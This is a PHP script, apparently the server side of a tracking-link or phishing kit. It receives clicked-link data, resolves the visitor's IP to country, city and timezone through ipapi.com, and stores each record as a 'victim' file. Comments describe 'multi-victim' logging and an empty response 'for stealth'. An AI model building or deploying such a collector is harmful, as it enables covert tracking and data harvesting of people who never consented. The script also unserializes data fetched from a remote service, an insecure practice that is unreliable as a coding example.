<?php
// log_click.php — Enhanced with geolocation + structured logging
// Original debug logic preserved + added IP geolocation

error_log("log_click.php accessed - REQUEST_METHOD: " . $_SERVER['REQUEST_METHOD']);

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit("Method Not Allowed");
}

$raw = file_get_contents('php://input');
error_log("Received raw data: " . $raw);

$data = json_decode($raw, true);
if (!$data || !isset($data['info'])) {
    error_log("Invalid JSON or missing 'info' key");
    http_response_code(400);
    exit("Bad Request");
}

// === Ambil IP asli (handle proxy jika ada) ===
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ip = trim(explode(',', $ip)[0]);

// === Default lokasi = None (sesuai output yang ingin Anda perbaiki) ===
$location = [
    'country'      => 'None',
    'city'         => 'None',
    'calling_code' => 'None',
    'timezone'     => 'None'
];

// === Ambil data geolokasi jika IP valid ===
if ($ip !== '0.0.0.0' && filter_var($ip, FILTER_VALIDATE_IP)) {
    $geoUrl = "http://ipapi.com/php/" . urlencode($ip);
    $geoRaw = @file_get_contents($geoUrl);
    
    if ($geoRaw !== false) {
        $geo = @unserialize($geoRaw);
        if (is_array($geo) && empty($geo['error'])) {
            $location = [
                'country'      => $geo['country_name'] ?? 'None',
                'city'         => $geo['city'] ?? 'None',
                'calling_code' => $geo['country_calling_code'] ?? 'None',
                'timezone'     => $geo['timezone'] ?? 'None'
            ];
        }
    }
}

// === Tambahkan IP & lokasi ke data utama ===
$data['info']['ip'] = $ip;
$data['info']['country']      = $location['country'];
$data['info']['city']         = $location['city'];
$data['info']['calling_code'] = $location['calling_code'];
$data['info']['timezone']     = $location['timezone'];

// === Simpan ke file flat (seperti asli Anda) ===
$json = json_encode($data, JSON_PRETTY_PRINT);
$write1 = file_put_contents('data.json', $json);         // File terbaru (overwrite)
$write2 = file_put_contents('Log.log', "Received");       // Flag sederhana

// === Simpan juga ke folder terstruktur (untuk multi-victim) ===
$timestamp = date('Y/m/d');
$logDir = "logs/" . $timestamp;
if (!is_dir($logDir)) {
    mkdir($logDir, 0777, true);
}
$uniqueFile = $logDir . "/victim_" . date('Ymd_His') . "_" . substr(md5(uniqid()), 0, 6) . ".json";
$write3 = file_put_contents($uniqueFile, $json);

// === Debug logging ===
error_log("Write data.json: " . ($write1 !== false ? "OK" : "FAILED"));
error_log("Write Log.log: " . ($write2 !== false ? "OK" : "FAILED"));
error_log("Write structured log: " . ($write3 !== false ? "OK" : "FAILED"));
error_log("Resolved location: " . json_encode($location));

// === Respons kosong untuk stealth ===
http_response_code(200);
?>